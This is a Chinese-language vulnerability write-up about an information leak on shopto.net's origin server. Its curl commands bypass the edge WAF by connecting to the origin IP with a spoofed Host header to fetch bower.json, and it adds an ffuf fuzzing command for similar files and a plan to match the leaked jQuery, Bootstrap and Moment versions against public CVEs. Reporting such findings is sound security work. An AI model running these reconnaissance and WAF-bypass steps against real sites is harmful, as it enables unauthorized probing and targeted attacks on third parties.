# shopto.net 源站 /bower.json 依赖清单匿名泄露

## 前置
- 直连源站 IP:443（CloudFront 源站，直连绕边缘 WAF）
- `curl -k`（忽略证书）；本机挂代理时加 `--noproxy '*'` 直连
- 请求头 `Host` 设任意非业务值（如 localhost）命中默认 vhost
- 旧 vhost 建议 `--http1.0`

## 复现
```bash
# 命中
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
     https://3.8.196.174/bower.json -w '\n%{http_code} %{size_download}\n'
```

命中回显：
```
HTTP/1.1 200 OK
Server: Apache
Content-Length: 629
Content-Type: application/json

{
  "name": "<dcshop 商家前端包名>",
  "version": "1.2.0",
  "dependencies": {
    "normalize-css": "~v4.2.0",
    "jquery": "~1.9.1",
    "bootstrap": "~3.3.7",
    "font-awesome": "4.7.0",
    "moment": "2.20.1",
    "eonasdan-bootstrap-datetimepicker": "^4.17.47"
  },
  "private": true
}
```

## 对照判据
```bash
# 同目录相似文件被名称规则保护
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/composer.json -o /dev/null -w '%{http_code}\n'   # → 403
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/composer.lock -o /dev/null -w '%{http_code}\n'   # → 403
# 随机不存在路径
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/nope-xyz -o /dev/null -w '%{http_code}\n'          # → 404
```
- `bower.json` = 200 且返回 JSON 依赖清单，而 `composer.json/.lock` = 403 ⇒ 判定 `bower.json` 属被遗漏、未纳入 `.htaccess` 名称保护的构建清单，而非有意公开。
- 随机路径 404 ⇒ 排除"整站兜底 200"假象。

## 铺面（找同类遗漏）
```bash
ffuf -u https://3.8.196.174/FUZZ -H 'Host: localhost' -k -w <wordlist> -mc 200 -fs <默认404字节数>
# 候选：bower.json package.json package-lock.json yarn.lock composer.json composer.lock .bowerrc gulpfile.js Gruntfile.js
```

## 利用方向
拿到前端依赖版本后，与公开 CVE 库比对（如 jquery 1.9.1 / bootstrap 3.3.7 / moment 2.20.1），对前端组件做定向漏洞匹配。

## 证伪条件
再次请求 `/bower.json` 返回 403/404（保护已补齐），或返回内容不含包名/依赖版本 ⇒ 本结论不成立。
